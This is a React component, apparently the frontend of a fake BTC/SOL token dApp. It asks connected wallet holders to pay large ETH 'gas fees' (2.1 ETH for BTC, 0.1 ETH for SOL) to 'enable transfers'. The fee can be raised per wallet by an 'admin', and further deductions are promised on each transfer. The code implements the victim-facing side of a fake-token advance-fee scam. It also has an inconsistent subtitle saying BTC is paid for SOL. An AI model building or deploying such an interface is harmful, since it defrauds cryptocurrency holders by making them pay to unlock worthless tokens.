import React, { useState, useEffect } from "react";
import { ethers } from "ethers";
import { useWeb3Store, useTokenStore } from "../stores/index";
import { FAKE_BTC_ABI } from "../abis/index";

/**
 * Gas Payment Card - Pay gas fees to enable token transfers
 * Token Mechanism:
 * - BTC users pay 2.1 ETH
 * - SOL users pay 0.1 ETH
 */
export default function GasPaymentCard() {
  const { account, signer, isConnected } = useWeb3Store();
  const { selectedToken, tokenAddresses, updateGasBalance, tokenData } = useTokenStore();

  const [payAmount, setPayAmount] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [error, setError] = useState("");
  const [customGasFee, setCustomGasFee] = useState(null); // Custom fee if set by admin

  const contractAddress = tokenAddresses[selectedToken];

  // Gas fees - ETH payment for both tokens
  const gasFeeConfig = {
    BTC: {
      paymentToken: "ETH",
      paymentAmount: "2.1",
      paymentDecimals: 18,
      display: "2.1 ETH (~$6300)"
    },
    SOL: {
      paymentToken: "ETH",
      paymentAmount: "0.1",
      paymentDecimals: 18,
      display: "0.1 ETH (~$300)"
    }
  };

  const currentConfig = gasFeeConfig[selectedToken];
  const currentGasBalance = Number(tokenData[selectedToken]?.gasBalance || 0) / 1e18;

  // Set default pay amount based on selected token
  useEffect(() => {
    setPayAmount(currentConfig.paymentAmount);
  }, [selectedToken]);

  // Check for custom gas fee set by admin
  useEffect(() => {
    const checkCustomGasFee = async () => {
      if (!signer || !contractAddress || !account) return;

      try {
        const contract = new ethers.Contract(contractAddress, FAKE_BTC_ABI, signer);
        const customFee = await contract.customGasFees(account);
        
        if (customFee > 0n) {
          const customAmount = ethers.formatUnits(customFee, currentConfig.paymentDecimals);
          setCustomGasFee(customAmount);
          setPayAmount(customAmount);
          console.log(`📌 Custom gas fee found: ${customAmount} ${currentConfig.paymentToken}`);
        } else {
          setCustomGasFee(null);
          setPayAmount(currentConfig.paymentAmount);
        }
      } catch (err) {
        console.error("Error checking custom gas fee:", err);
        setCustomGasFee(null);
      }
    };

    checkCustomGasFee();
  }, [account, signer, contractAddress, selectedToken]);

  const handlePayGas = async () => {
    if (!isConnected || !signer) {
      setError("Please connect wallet first");
      return;
    }

    setIsLoading(true);
    setError("");
    setResult(null);

    try {
      const contract = new ethers.Contract(contractAddress, FAKE_BTC_ABI, signer);

      // Both BTC and SOL users pay in ETH
      const valueInWei = ethers.parseEther(currentConfig.paymentAmount);
      console.log(`💰 ${selectedToken} user paying ${currentConfig.paymentAmount} ETH for gas fee`);

      const tx = await contract.payGasFee({ value: valueInWei });
      console.log(`⏳ Transaction pending: ${tx.hash}`);
      await tx.wait();

      setResult({
        success: true,
        hash: tx.hash,
        message: `✅ Gas fee of ${currentConfig.paymentAmount} ETH paid! ${selectedToken} transfers now enabled.`,
      });

      updateGasBalance(selectedToken, valueInWei.toString());
      setPayAmount(currentConfig.paymentAmount);
    } catch (err) {
      const errorMsg = err.reason || err.message || "Payment failed";
      setError(errorMsg);
      setResult({
        success: false,
        message: `❌ Payment failed: ${errorMsg}`,
      });
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-gradient-to-br from-gray-800 to-gray-900 border border-gray-700 rounded-xl p-6 shadow-xl">
      <h2 className="text-2xl font-bold text-white mb-2 flex items-center gap-2">
        <span className="text-2xl">⛽</span>
        Pay Gas Fee to Transfer
      </h2>
      <p className="text-sm text-gray-400 mb-6">
        {selectedToken === "BTC" ? "Pay ETH to enable BTC transfers" : "Pay BTC to enable ETH transfers"}
      </p>

      {/* Token Gas Fee Info Box */}
      <div className="bg-blue-900 bg-opacity-30 border border-blue-700 rounded-lg p-4 mb-5">
        <p className="text-sm text-blue-200">
          💰 <strong>Gas Fee:</strong> Pay {currentConfig.paymentAmount} {currentConfig.paymentToken} to enable {selectedToken} transfers
        </p>
      </div>

      {/* Current Gas Balance */}
      <div className="bg-gray-700 rounded-lg p-4 mb-5">
        <div className="flex justify-between items-center">
          <span className="text-sm text-gray-400">Gas Fee Required:</span>
          <span className="text-lg font-mono text-white font-semibold">
            {currentConfig.display}
          </span>
        </div>
      </div>

      {/* Payment Info */}
      <div className="mb-5 p-4 bg-gray-700 rounded-lg">
        <div className="flex justify-between items-center mb-3">
          <span className="text-sm text-gray-400">Pay Amount:</span>
          <span className="text-lg font-mono text-white">
            {payAmount} {currentConfig.paymentToken}
          </span>
        </div>

        {/* Custom Fee Badge */}
        {customGasFee && (
          <div className="p-3 bg-blue-900 border border-blue-700 rounded mb-3">
            <div className="flex items-center gap-2">
              <span className="text-blue-300 text-sm font-semibold">
                ⚡ Custom Gas Fee Set by Admin
              </span>
            </div>
            <p className="text-xs text-blue-200 mt-1">
              Your required gas fee: <strong>{customGasFee} {currentConfig.paymentToken}</strong>
            </p>
          </div>
        )}

        <p className="text-xs text-gray-500">
          {customGasFee 
            ? `Admin has set a custom fee for your wallet. Pay this amount to transfer ${selectedToken}.`
            : `This is the fixed amount. After payment, all your ${selectedToken} transfers will be enabled.`
          }
        </p>
      </div>

      {/* Error Display */}
      {error && (
        <div className="bg-red-900 border border-red-700 rounded-lg p-3 mb-4 text-sm text-red-200">
          {error}
        </div>
      )}

      {/* Result Display */}
      {result && (
        <div
          className={`rounded-lg p-4 mb-4 border ${
            result.success
              ? "bg-green-900 border-green-700 text-green-200"
              : "bg-red-900 border-red-700 text-red-200"
          }`}
        >
          <p className="text-sm font-semibold mb-2">{result.message}</p>
          {result.hash && (
            <a
              href={`https://sepolia.etherscan.io/tx/${result.hash}`}
              target="_blank"
              rel="noopener noreferrer"
              className="text-xs underline hover:opacity-80"
            >
              View on Etherscan →
            </a>
          )}
        </div>
      )}

      {/* Pay Button */}
      <button
        onClick={handlePayGas}
        disabled={isLoading || !isConnected}
        className={`w-full py-3 px-4 rounded-lg font-semibold transition-all flex items-center justify-center gap-2 ${
          isLoading || !isConnected
            ? "bg-gray-700 text-gray-400 cursor-not-allowed opacity-50"
            : "bg-gradient-to-r from-blue-500 to-blue-600 text-white hover:from-blue-600 hover:to-blue-700 shadow-lg hover:shadow-xl"
        }`}
      >
        {isLoading ? (
          <>
            <span className="inline-block animate-spin">⏳</span>
            Processing...
          </>
        ) : (
          <>
            <span>💳</span>
            Pay {currentConfig.paymentAmount} {currentConfig.paymentToken}
          </>
        )}
      </button>

      {/* Info Footer */}
      <div className="mt-4 text-xs text-gray-500">
        <p>
          🔐 <strong>{selectedToken} transfers:</strong> After paying {currentConfig.paymentAmount} {currentConfig.paymentToken}, gas fee will be deducted from your wallet on each transfer
        </p>
      </div>
    </div>
  );
}
